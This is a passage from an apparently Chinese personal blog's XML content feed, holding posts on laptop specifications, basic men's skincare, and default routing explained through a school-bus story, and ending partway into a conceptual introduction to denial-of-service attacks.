            <tag> 教程 </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>还在为搞不懂笔记本电脑参数而苦恼么？一篇文章就够啦</title>
      <link href="/2020/07/19/huan-zai-wei-gao-bu-dong-bi-ji-ben-dian-nao-can-shu-er-ku-nao-me-yi-pian-wen-zhang-jiu-gou-la/"/>
      <url>/2020/07/19/huan-zai-wei-gao-bu-dong-bi-ji-ben-dian-nao-can-shu-er-ku-nao-me-yi-pian-wen-zhang-jiu-gou-la/</url>
      
        <content type="html"><![CDATA[<p>要说笔记本电脑的参数，我们可以从两个角度去切入，一个是关于性能，另一个是关于体验。</p><p>关于<strong>性能</strong>的参数有：<strong>CPU、显卡、内存、硬盘</strong>，这综合决定了你电脑运行时是否流畅，顺滑。</p><p>关于<strong>使用</strong>体验的有：<strong>屏幕、散热、接口、拓展性</strong>，这决定了你的视觉体验、触感体验以及充电体验是否良好等。</p><p>接下来，我一个一个来说明：<br><br></p><h2 id="CPU-中央处理器，计算机的大脑"><a href="#CPU-中央处理器，计算机的大脑" class="headerlink" title="CPU:中央处理器，计算机的大脑"></a><strong>CPU:中央处理器，计算机的大脑</strong><br></h2><p>我们经常说一个人才思敏捷，实际上便是说他的脑子转得快，思路清晰。</p><p>对笔记本电脑也是如此，一个好的CPU，很大程度上代表着流畅的反应速度、高效的数据处理能力以及相对较低的功耗。</p><p>在品牌选择上，我建议预算足够优先选择Intel，预算不高的情况下再选用AMD。</p><p>至于具体参数，主要看核心数、主频这两个参数，以上两个参数越高，就代表性能越好。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073355906.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="显卡-GPU，决定你能玩什么类型的游戏"><a href="#显卡-GPU，决定你能玩什么类型的游戏" class="headerlink" title="显卡:GPU，决定你能玩什么类型的游戏"></a><strong>显卡:GPU，决定你能玩什么类型的游戏</strong></h2><p>大多数情况下，游戏相对于CPU其实更需要显卡的性能支持。你可以理解为显卡是你接触游戏世界的一个通行证，显卡的性能上限决定你到底可以运行哪类游戏。</p><p>简单来说，显卡与玩游戏息息相关，显卡越牛，你就能运行越大型的游戏，开越高级的特效。</p><p>大多数情况下，独立显卡的性能都优于集成显卡。</p><p>至于具体参数，主要看四个参数：显存位宽、频率、显存带宽、流处理器。这四个参数都是越大越好<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073419675.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="内存-RAM，大脑的缓冲期，里面有正在使用的软件或马上要使用的软件"><a href="#内存-RAM，大脑的缓冲期，里面有正在使用的软件或马上要使用的软件" class="headerlink" title="内存:RAM，大脑的缓冲期，里面有正在使用的软件或马上要使用的软件"></a><strong>内存:RAM，大脑的缓冲期，里面有正在使用的软件或马上要使用的软件</strong></h2><p>内存，RAM,载入数据块，用于存放临时程序与数据，其容量大小直接决定你在电脑后台可以开多少进程（软件或服务等），以及进程的响应速度和运行流畅度。</p><p>就内存而言，总容量越大越好<br>如果你是4G内存，估计多开几个软件就会卡。<br>如果你是8G内存，这是市面上主流配置，够绝大多数情况下使用。<br>如果你是16G内存，那你已经领先了绝大多数笔记本电脑。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051807343452.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="硬盘-作为内存的缓冲期，内存从硬盘中读取软件信息"><a href="#硬盘-作为内存的缓冲期，内存从硬盘中读取软件信息" class="headerlink" title="硬盘:作为内存的缓冲期，内存从硬盘中读取软件信息"></a><strong>硬盘:作为内存的缓冲期，内存从硬盘中读取软件信息</strong></h2><p>硬盘，读取数据速度较慢，用于存放安装程序、视频、音频、文档等各种数据，其容量大小决定了你在电脑中能安装多少软件，能存放多少歌曲、电影、电子书，而不会影响运行速度。</p><p>硬盘有机械硬盘和固态硬盘之分，你要知道最基础的一点<br>读取速度上，绝对的，固态硬盘 &gt; 机械硬盘,只要是固态硬盘，读取速度就比机械硬盘快无数倍，虽然固态硬盘数据丢失找不回来</p><p>总之，有条件情况下，用固态准没错的。<br>没条件情况下，买机械硬盘，着重看两点：<br>①转数，转数越大，性能越好。<br>②容量，容量越大，可存储的东西越多。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073500312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>在这里插一条我个人的理解，有关于内存和硬盘的关系：</p><p>打个比方，如果把硬盘比作收纳箱的话，那内存就是你的随身衣服的口袋，这里假定<br>收纳箱里的东西都需要先放到口袋里才能被我们直接使用，那么：<br>收纳箱的空间决定我们到底可以拥有多少工具、电器<br>而随身的口袋能决定我们能同时使用多少工具和电器</p><p><br><br></p><h2 id="屏幕-直接决定我们的视觉体验"><a href="#屏幕-直接决定我们的视觉体验" class="headerlink" title="屏幕:直接决定我们的视觉体验"></a><strong>屏幕:直接决定我们的视觉体验</strong></h2><p>就像看视频的时候，你大概率是能开1080P，就开1080P，除非网速受限的情况下才会做调整。<br>对于电脑屏幕也是，有条件的情况下尽可能满足以下3点：</p><p>1、分辨率尽量大，大分辨率的好处是屏幕可以同时展示更多的内容，开个软件什么的也比较完整。</p><p>2、 屏幕的色域值越高越好，特别在一些高动态对比的画面或者游戏中，你可以更好发现细节差异，低色域的常常糊成一片，看不出灰度差距。 </p><p>3、屏幕刷新高，对笔记本来说，有144hz的更好，但价格很贵，还不如自己再补一个外置显示器。</p><p>当然也有不少人没有太过于注重笔记本电脑本身的屏幕参数，而选择购买一个好的外置显示器，高分辨率+超大寸，感官体验也是一级棒。这就根据大家自身情况而定了。<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073510723.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="散热-体现笔记本性能、摸起来烫不烫、噪音大不大"><a href="#散热-体现笔记本性能、摸起来烫不烫、噪音大不大" class="headerlink" title="散热:体现笔记本性能、摸起来烫不烫、噪音大不大"></a><strong>散热:体现笔记本性能、摸起来烫不烫、噪音大不大</strong></h2><p>你想想啊，你文档写着写着，游戏打着打着，突然手臂感觉要被烫伤了，这是一种多么郁闷的体验。（比较夸张的举例）</p><p>散热很重要，但人们有一个普遍的错误认知，那就是：<br>风扇狂转、表面很烫、出风口烫  =  散热不好</p><p>实际上笔记本电脑散热设计有一个原则:如果无法避免热量，那就把发热区域远离人经常碰的地方。<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073525418.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="接口-与你日常充电、数据传输息息相关"><a href="#接口-与你日常充电、数据传输息息相关" class="headerlink" title="接口:与你日常充电、数据传输息息相关"></a><strong>接口:与你日常充电、数据传输息息相关</strong></h2><p>关于接口，目前已知，USB-C是目前最先进的USB接口</p><p>在电脑内部支持协议上，雷电3＞USB3.1＞USB3.0，雷电3协议同时支持充电和数据传输</p><p>雷电3协议支持的USB-C就像手机充电口一样，既可以充电又可以传输数据，非常方便。</p><p>除此之外，10Gbps的USB-C接口支持4K显示屏，方便外接显示屏。</p><p>简单一句话，如果你的电脑能够有一个高传输速率的USB-C接口，你充电、传输数据、外接显示屏都很方便。<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051807354026.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="扩展性-代表有多少种可以更换的部件"><a href="#扩展性-代表有多少种可以更换的部件" class="headerlink" title="扩展性:代表有多少种可以更换的部件"></a><strong>扩展性:代表有多少种可以更换的部件</strong></h2><p>这对有升级电脑配置有需求的人群来说非常关键，尤其是对电脑配置有职业要求的人，买笔记本电脑的时候多考虑能更换的部件，能为之后工作省不少钱</p><p>一般来说呢，游戏本能更换的比较多，比如内存、固态、显卡<br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200518073557440.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机小知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件知识 </tag>
            
            <tag> 笔记本电脑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给程序猿的一节男士基础护肤课</title>
      <link href="/2020/07/19/gei-cheng-xu-yuan-de-yi-jie-nan-shi-ji-chu-hu-fu-ke/"/>
      <url>/2020/07/19/gei-cheng-xu-yuan-de-yi-jie-nan-shi-ji-chu-hu-fu-ke/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081019627.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h1><p>最近起床啊，老是感觉脸上油腻腻的，莫非是昨天夜宵吃得太多？</p><p>早上洗漱的时候，特意对着镜子臭美臭美，突然间发现高中三年我引以为傲的肤质，现在却也被折磨地粗糙了些。</p><p>于是，我痛定思痛，写下这篇文章，不仅是分享给大家一些护肤小知识，更是提醒自己要注意自己的皮肤状况。</p><p>对于我们男生来说，我们并不要求，我们的的皮肤多么光鲜亮丽，白里透红。我觉得，我们的首要目标，是要做到<strong>健康、干净，不油腻</strong>。</p><p>这里的健康指的是<strong>没有皮肤疾病、皮肤状态稳定、不轻易过敏</strong></p><p>这里的干净值得是<strong>肤色均匀、色斑不多</strong></p><p>但如果真的有那么一天，有的人昧着良心夸我：你皮肤真好的时候，我也希望可以轻描淡写来一句：哪有哪有，天生丽质而已！</p><p><strong>以下是本文致力分享的内容：</strong></p><p>01 正确的护肤步骤是什么？</p><p>02 具体的护肤步骤是怎么样的？</p><p>03 最简单的护肤怎么弄？</p><h1 id="01-正确的护肤步骤"><a href="#01-正确的护肤步骤" class="headerlink" title="01 正确的护肤步骤"></a>01 正确的护肤步骤</h1><p>说起护肤，在我们程序员的眼里</p><p>可能只有<strong>洗面奶</strong>一说，听到这</p><p>可能有人会问：什么？难道还有其他鬼东西</p><p>其实，如果要说到完备的护肤，它包括：<strong>洗面奶  爽肤水   精华液   保湿乳/面霜   防晒霜、卸妆水、去角质、润唇膏、面膜、祛黑头产品等</strong></p><p><strong>但是我等程序员啊，是在是不想在护肤这件产品上浪费太多时间，就算是我也不愿每天二十分钟以上的时间来护肤，感觉有这闲时间还不如多睡会儿回笼觉呢是不？这想法我是能理解的，但是也不用担心，我在文章最后会给出最简单的护肤攻略。</strong></p><p>拉回正题，先来看看正确的护肤步骤是什么吧：</p><p><strong>清洁–&gt; 补水–&gt; 上精华–&gt; 保湿–&gt; 防晒</strong></p><p>对应的护肤品使用即:</p><p><strong>洗面奶 –&gt;  爽肤水 –&gt;   精华液 –&gt;   保湿乳/面霜 –&gt;   防晒霜</strong></p><p>那可能有人就会问：为什么要按顺序护肤呢？都是涂在脸上，只要皮肤吸收了不就好了吗？</p><p>在这里，为了让大家更容易理解，为什么要按这种顺序护肤，在以下说明中，<strong>我把皮肤比作一块海绵</strong>🧽</p><h2 id="1-清洁"><a href="#1-清洁" class="headerlink" title="1.清洁"></a>1.清洁</h2><p>我们洗用洗面奶完洗完脸后，皮肤很将会很干燥，就像是一块<strong>被挤干了水的海绵</strong>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081038113.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>这是因为我们的面部表皮通常情况下会有<strong>油脂覆盖</strong>，洗脸之后，油脂会被洗去，而且水分挥发会带走一部分肌肤水分，从而使得洗脸后皮肤出现紧绷感、干燥感。</p><h2 id="2-补水"><a href="#2-补水" class="headerlink" title="2.补水"></a>2.补水</h2><p>补水非常重要，补水后海绵就会获得新生，变得有活力，更重要的是，充满了水的海绵更容易传导物质。</p><p><strong>你可以想象一下，一块干海绵和一块湿海绵，如果同时滴上一滴红墨水，那么会是那块海绵会被红墨水渗透的更广更深呢？</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081055164.jpg#pic_center" alt=""><br>简而言之，补水让我们之后的护肤步骤更有效果。</p><h2 id="3-上精华"><a href="#3-上精华" class="headerlink" title="3.上精华"></a>3.上精华</h2><p>涂了精华液之后，皮肤可以<strong>吸收营养</strong>变得更滑嫩 Q 弹</p><p>正如补水时所说，如果你在干燥的海绵上直接涂上精华液，少了补水步骤就会缺乏传导，<strong>大多数精华都会停留在表面</strong>，做做表明功夫，这可浪费了。所以大家记住，补水很重要，洗完脸后就要记得补水咯！<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081104704.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="4-保湿"><a href="#4-保湿" class="headerlink" title="4.保湿"></a>4.保湿</h2><p>保湿露或者面霜都可以给皮肤制造一层保护膜，可以帮助我们防止皮肤内的水分和精华流失。</p><p>其实小时候我们的皮肤都有一层薄膜叫<strong>油脂薄膜</strong>，这层薄膜是用来防止皮肤水分以及精华流失的。所以一定年纪之下的小童鞋，他们的皮肤看上去就很润，白里透红，非常让人羡慕。</p><p>但是呢，岁月不饶人，随着时间的推移，大部分人的这层薄膜都被岁月磨平了。<strong>先天不足，后天来凑</strong>。这时候我们就可以选择人为地制造一层这样的薄膜，帮我们<strong>锁住皮肤里的水分</strong>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081115161.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="5-防晒"><a href="#5-防晒" class="headerlink" title="5.防晒"></a>5.防晒</h2><p>防晒是护肤的最后一步，也非常重要。</p><p>除了物理防晒：打伞、戴墨镜、帽子之外，请一定要记得<strong>涂防晒霜</strong>，<strong>防晒非常重要</strong>。<br>很多男生认为黑点儿没事，显得健康，而这是错的。</p><p>之前在一篇医学文章里我了解到，青壮年时期<strong>过度暴露在紫外线</strong>之下，在老年时期是会生病的，是会惧怕阳光的，真心希望大家以后是能在阳光下健步如飞的程序员。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081125192.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>以上便是正确的护肤步骤。</p><p>步骤是了解了，那么具体护肤的时候，是不是把护肤品往手上一抹，脸上一糊弄就可以了呢？<br>别担心，我下一步就分享给你护肤的一些小细节！</p><h1 id="02-具体的护肤细节"><a href="#02-具体的护肤细节" class="headerlink" title="02 具体的护肤细节"></a>02 具体的护肤细节</h1><h2 id="1-清洁-1"><a href="#1-清洁-1" class="headerlink" title="1.清洁"></a>1.清洁</h2><p><strong>1.1 正确的洗脸姿势</strong></p><p>1.首先需要对症下药，<strong>根据自己的皮肤类型选择对应的洗面奶</strong>，并且把握洗脸频率，每天<strong>1~2次</strong>即可。</p><p>2.<strong>用流动的水洗脸</strong>，不要在脸盆里洗，水的温度最好在<strong>25~30 ℃</strong>（感性上看温水即可），因为过热会导致毛孔张开过大，而过冷会导致毛孔闭合，洗不干净。</p><p>3.先把洗面奶挤到手上<strong>搓出泡沫</strong>，然后用手轻轻按摩、<strong>搓洗脸部 一分钟左右</strong>，再用清水把脸上的泡沫<strong>冲洗干净</strong>，然后用<strong>毛巾擦干</strong>脸部。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081158894.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>这里注意，我知道很多人为了图方便会选择自然风干，甚至得意的认为比较补水。而这种观念是错的，自然风干的过程是会带走你皮肤更多的水分，让你的皮肤更干燥的。</p><p><strong>1.2 错误的洗脸姿势</strong></p><ol><li><p>洗脸<strong>只用清水</strong>。要知道，只用清水洗脸是洗不干净那层油脂污垢的。</p></li><li><p>洗脸时大力出奇迹，<strong>用力猛搓皮肤</strong>，或者经常用那种磨砂洗面奶，觉得那样才能洗干净。</p><p>这都是错误的行为，因为用力过猛以及长期使用磨砂洁面会让皮肤表面的角质层脱落消失，<strong>导致皮肤过敏，甚至感染</strong>。</p><br>## 2.补水</li></ol><p><strong>2.1 正确的补水姿势</strong></p><ol><li><p>洁面之后<strong>立刻涂抹</strong>，取适量爽肤水于掌心，然后以<strong>拍打方式</strong>涂于脸上。 </p></li><li><p>可用手掌搓热后，轻轻拍打、按摩脸部，<strong>促进爽肤水的吸收</strong>。 </p></li></ol><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081215477.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>2.2 错误的补水姿势</strong></p><ol><li><p>洁面后休息一会儿，等到皮肤非常干燥了再亡羊补牢。</p></li><li><p>把爽肤水往脸上一糊，搓一搓就了事。 </p></li></ol><h2 id="3-精华液、保湿乳"><a href="#3-精华液、保湿乳" class="headerlink" title="3.精华液、保湿乳"></a>3.精华液、保湿乳</h2><p>因为这两步的操作方式基本相同，所以放在一起说明</p><p><strong>3.1 正确的保湿姿势</strong></p><p>1.取适量于掌心轻柔预热，然后<strong>均匀</strong>涂于脸上。</p><p>2.用量上用满<strong>两个指间单位</strong>，如果你是干性皮肤的话，可叠加涂抹，多次涂抹</p><p>3.手掌搓热保湿乳，以打圈的形式在脸颊上做向上<strong>提拉按摩</strong>，以促进皮肤的吸收</p><p><strong>3.2 错误的保湿姿势</strong></p><p>1.认为保湿和防晒不能同时使用，顾此失彼</p><p><br><br></p><h2 id="4-涂防晒霜"><a href="#4-涂防晒霜" class="headerlink" title="4.涂防晒霜"></a>4.涂防晒霜</h2><p><strong>4.1 正确的防晒姿势</strong></p><ol><li><p>日常用量上，至少涂满<strong>一元硬币大小</strong>的量，均匀涂抹在脸上</p></li><li><p>如果长期暴露在阳光下，那建议你带上<strong>防晒喷雾</strong>，2个小时喷一次，或者做好物理防晒</p></li><li><p>出门前<strong>15分钟到20分钟</strong>涂抹，这样你出门后防晒效果最好</p></li></ol><p><strong>4.2 错误的防晒姿势</strong></p><p>1.涂了防晒霜之后认为自己天下无敌，走路都要挑有阳光的地方走。</p><p>2.涂防晒霜<strong>扣扣搜搜</strong>，没用够量，这里有涂，那里没涂的<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081241240.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="03-基础护肤攻略"><a href="#03-基础护肤攻略" class="headerlink" title="03 基础护肤攻略"></a>03 基础护肤攻略</h1><p>总的来说，对于男生而言，想做到<strong>皮肤健康、干净，不油腻</strong>的话:</p><p>最好情况下需要做好清洁，再补水，然后涂上精华液，之后就是擦乳液或者面霜制造保护层，防止里面的水分流失，最后一步就是做好防晒。这样长久下来你的皮肤就不会差到哪里去。</p><p>而对于我们程序员来说，就算一切从简，只要做到<strong>清洁、补水、防晒</strong>这三点就也可以战胜全国 95% 的男性了。</p><p>所以，洗面奶、爽肤水、防晒霜这三款护肤品，我们安排上。</p><p><strong>至于怎么买？买什么？最简单来说，洗面奶挑氨基酸洗面奶，爽肤水、防晒霜挑大牌子的，妮维雅、欧莱雅都可。</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200526081255894.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>希望大家可以做同龄人中的的林志颖哟！</strong><br><strong>可以的话，留个赞再走呗</strong></p>]]></content>
      
      
      <categories>
          
          <category> 生活百科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 护肤 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搞不懂缺省路由？一个故事告诉你</title>
      <link href="/2020/07/19/gao-bu-dong-que-sheng-lu-you-yi-ge-gu-shi-gao-su-ni/"/>
      <url>/2020/07/19/gao-bu-dong-que-sheng-lu-you-yi-ge-gu-shi-gao-su-ni/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200528100046773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="00-对路由的理解"><a href="#00-对路由的理解" class="headerlink" title="00 对路由的理解"></a>00 对路由的理解</h1><p>首先我先来分享分享我对路由的理解：<br>在我的理解里，路由器和路由表的形式类比于<strong>一个点</strong>和<strong>一条线</strong>。</p><p><strong>一个点指的是一个坐标，可以理解成是肯德基或者麦当劳在地图上的一个坐标</strong>。</p><p><strong>一条线指的是这个点要想到达其他点可选的一条线路</strong>。</p><p>我们知道<strong>点线成面</strong>，这里也是如此。</p><p>网络上众多的路由器，路由器上许多的路由表，总多的点线整合起来就成了一张<strong>地图</strong>，一张网络的地图。</p><p>在这个地图的帮助下，我们就可以顺利地从处于北京的网络地址A访问到处于上海的网络地址B。</p><p><strong>这里有个地方要注意了，使用这个地图的方法很特殊</strong>，那就是你必须<strong>按顺序一个一个点来</strong>，否则是会迷路的！！！</p><p>举个栗子：<br><strong>你现在处于A地，你想要前往C地，沿途会经过B地。</strong></p><p>这个时候你会发现，你想要选择去C地，但是地图上并没有显示C地的具体位置，而是指示你要去B地的路线。而只有你<strong>到达B地之后</strong>，<strong>B地才会告诉你怎么去往C地</strong>。</p><p>也就是说，<strong>虽然你不能掌握全局，但是只要按照地图一步一步来，你就会越来越接近目的地，直到最后你就会到达你想要的目的地</strong>。</p><p>这里的理解可以类比于多米诺骨牌，比如第一张牌，能够砸到自己的下一张牌，即下一跳，第二张牌能够找到自己的下一跳，即第三张牌。依次滴递推，无论中间有多少个骨牌，只要可以够找到自己的下一跳，便可以找到终点。因为这个游戏规则是：<strong>下一跳更接近终点</strong>  ，这样起点和终点就能沟通起来。</p><p>在这里，我们可以继续发散思维，<strong>如果多米诺骨牌中的其中一张牌没有被上一张牌推倒，那么最后一张牌会被推倒嘛</strong>？</p><p>肯定是不会的，所以说如果你想要从A到达C，而途径到B却发现B地没有去往C地的指示，那么你就会被卡在B点，达到不了C地的。</p><p><br><br></p><h1 id="01-缺省网关在路由表里的形式"><a href="#01-缺省网关在路由表里的形式" class="headerlink" title="01 缺省网关在路由表里的形式"></a><strong>01 缺省网关在路由表里的形式</strong></h1><p>说完对路由的理解，那么说回正题，接下来我们就来看看缺省路由/网关</p><p><strong>缺省路由长什么样呢？</strong></p><p>长如下这样:</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200528092733175.png" alt=""></p><p>这条缺省路由的实际意思是：<strong>我海纳百川，不管你的网络号是什么、掩码是什么，只要你不清楚下一步要去哪里，就选择我吧，我会使用物理接口Eth0发送给下一跳，会让你更接近目的地的</strong><br><br><br><br><br></p><h1 id="02-用故事理解缺省路由"><a href="#02-用故事理解缺省路由" class="headerlink" title="02 用故事理解缺省路由"></a><strong>02 用故事理解缺省路由</strong></h1><p>  受疫情影响，某学校要求孩子放学后要么由家长接送要么统一乘坐校车回家。下课铃响后，孩子们纷纷跑到校门口寻找自己的家长，找到自己家长的孩子开心地牵着家长的手回去，我们发现，家长或许不会马上带着孩子回家，可能还会带着孩子去逛逛街、吃吃小吃。但毫无疑问，最终的目的地通常都是家中。也就是说，<strong>孩子不用考虑那么多，只要牵着家长的手即可更接近家里</strong>。（路由器根据路由表匹配目的IP地址，将报文发给对应的下一跳）<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200528100112237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>小明、李四倒都很幸运，很快就找到了自己的家长，牵着家长的手坐车离去。但是学校门口，还有很多包括张三在内的许多同学没有回家，老师大声呼喊着：<strong>没有找到家长的同学，过来统一坐校车回家</strong>。（如果报文在路由表里匹配不到目的IP地址，则统一发给某个地址）</p><p>在这里，老师说的校车就是剩下同学的<strong>最后的选择</strong>，也就是我们说的缺省（默认）网关。</p><p><br><br><br></p><p><strong>觉得本文对你有帮助的话，还请点个赞多多支持哟<del>~</del></strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由 </tag>
            
            <tag> 网关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务攻击：就找你茬，咋滴啦！</title>
      <link href="/2020/07/19/ju-jue-fu-wu-gong-ji-jiu-zhao-ni-chi-zha-di-la/"/>
      <url>/2020/07/19/ju-jue-fu-wu-gong-ji-jiu-zhao-ni-chi-zha-di-la/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105617791.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>本文，将从以下四点展开分享，可戳蓝色字体快速跳转：</p><p>01 拒绝服务攻击感性认知是什么？</p><p>02 拒绝攻击服务理性认知是什么？</p><p>03 常见拒绝服务攻击有哪些？</p><p>04 对于拒绝服务攻击，我们能做什么?</p><h1 id="01-拒绝服务攻击感性认知"><a href="#01-拒绝服务攻击感性认知" class="headerlink" title="01 拒绝服务攻击感性认知"></a>01 拒绝服务攻击感性认知</h1><p>拒绝服务攻击，从某个角度上你可以认为是一种<strong>人为的堵车</strong>。</p><p>我们假设对方服务器开设了一条高速通道，一条可以容纳10辆车同时并排行驶的通道。每辆车必须通过这条高速通道，才能最终到达服务器内部，访问自己想要的资源。</p><p>但是有一些心怀不轨的人，故意搞破坏，安排了大量的车去强占你的车道<br>这种情况下，你想啊，成百上千辆的车同时都想并排行驶，这能不堵车嘛？服务能受得住嘛？</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105657137.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" 